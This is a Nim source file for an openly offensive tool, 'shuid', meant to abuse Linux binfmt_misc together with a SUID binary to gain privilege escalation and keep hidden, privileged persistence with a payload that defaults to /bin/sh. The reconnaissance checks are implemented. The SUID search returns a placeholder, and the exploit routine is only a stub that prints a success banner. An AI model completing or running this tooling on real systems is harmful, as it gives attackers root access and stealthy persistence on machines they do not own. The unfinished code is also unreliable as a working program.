import posix
import osproc
import os
import std/posix_utils
import std/strutils
import terminal

proc checkBinfmt(privesc:bool):bool=
  ## Different checks to verify that the binfmt config allow the exploit
  ## - check if BINFMT module is loaded in kernel(config file)
  ## - check if BINFMT is mount
  ## - check if BINFMT is enabled 
  ## - check if the register file is writable by user if privesc mode
  
  # search module in boot config files
  let moduleExist = execCmdEx("grep 'BINFMT_MISC' /boot/config-`uname -r`").exitCode
  if moduleExist != 1:
    styledEcho("⚠️ Do not find ",fgYellow,"BINFMT_MISC module ",fgWhite,"in /boot/config directory")
  
  # is mount?
  let isMount = execCmdEx("mount | grep binfmt_misc")
  if isMount.exitCode != 0:
    styledEcho("⚠️ Failed to ",fgYellow,"execute mount",fgWhite,": ",isMount.output)
    styledEcho("❌ binfmt kernel feature",fgRed," seems to be disabled")
    return false
  elif isMount.output == "":
    styledEcho("⚠️ binfmt is ",fgYellow,"not mounted")
    styledEcho("❌ binfmt kernel feature",fgRed," seems to be disabled")
    styledEcho(fgBlue, "Try mounting binfmt: mount binfmt_misc -t binfmt_misc /proc/sys/fs/binfmt_misc")
    return false

  # check if enable
  let enabled = readFile("/proc/sys/fs/binfmt_misc/status").replace("\n", "")
  case enabled
  of "1","enabled": discard
  else:
    styledEcho("❌ binfmt kernel feature",fgRed," seems to be disabled")
    styledEcho(fgBlue, "Try enabling binfmt with: echo 1 > /proc/sys/fs/binfmt_misc/status")
    return false
  
  # register writable
  if privesc:
    let isRegisterWritable = execCmdEx("test -w /proc/sys/fs/binfmt_misc/register").exitCode
    if isRegisterWritable!=0:
      styledEcho("❌ /proc/sys/fs/binfmt_misc/register ",fgRed," is not writable by user")
      #TODO: Provide a way to the user to specify another way to write into register (e.g /usr/lin/toto/register is writable)
      return false

  return true

proc isSETUID*(m: Mode,s=""): bool =
  ## Determine if a file has setuid bytes set
  ## (see https://github.com/c-blake/lc/blob/master/lc.nim#L568)
  let m = m.uint and 4095
  result = (m and 0o4000) != 0 and (m and 0o100) != 0

proc searchSuid(dir, file: string,chooseFile: bool): string=
  ## Find SUID fiels in a given directory. if file is filled nothing is done
  ## - chooseFile parameter make the user chose the file (user input)
  ## - otherwise the suid file is chosen randomly
  
  if file != "": return file

  var suids : seq[string]
  for kind, path in walkDir(dir):
    case kind:
    of pcFile:
      if isSETUID(stat(path).st_mode):
        suids.add(path)
    # of pcLinkToFile:
    #   #symlink
    #   echo "Link to file: ", path
    else: discard
  echo(suids)
  return "toto"

proc exploit(suid, payload: string): void=
  #[
  Obtain Magic number
  Interpreter (nim/C)
    -> Execute suid after
  ]#
  echo("\n🌒  binfmt has been exploited to maintain privileged persistence.")
  echo "\e[2mWelcome in the shadow\e[0m"

proc shuid(
  privesc = false, 
  check = true, 
  file = "", 
  searchDir="/bin", 
  chooseFile = false, 
  payload = "/bin/sh",
  noExec=false
  ): void =
  if check:
    if checkBinfmt(privesc):
      styledEcho("✔️ binfmt kernel feature is",fgGreen," enabled")
    else: quit(QuitSuccess)

  # Search SUID file to hide our payload
  let suid = searchSuid(searchDir,file,chooseFile)
  if suid != "": styledEcho("🎯 SUID target file: ",fgCyan,suid)
  else:
    styledEcho("❌ No SUID file in ",fgRed,searchDir)
    quit(QuitSuccess)

  exploit(suid,payload)
  


when isMainModule:
  import cligen;  dispatch shuid, help={"privesc": "run in unprivileged mode to obtain privesc",
  "check": "perform exploit requirement checks",
  "file": "SUID file to use",
  "searchDir": "directory use to find SUID file",
  "chooseFile": "choose SUID file to use from the list (if not taken randomly)",
  "payload": "payload to execute to maintain peristance (run with privileged permissions)",
  "noExec": "do not exec SUID file"
  }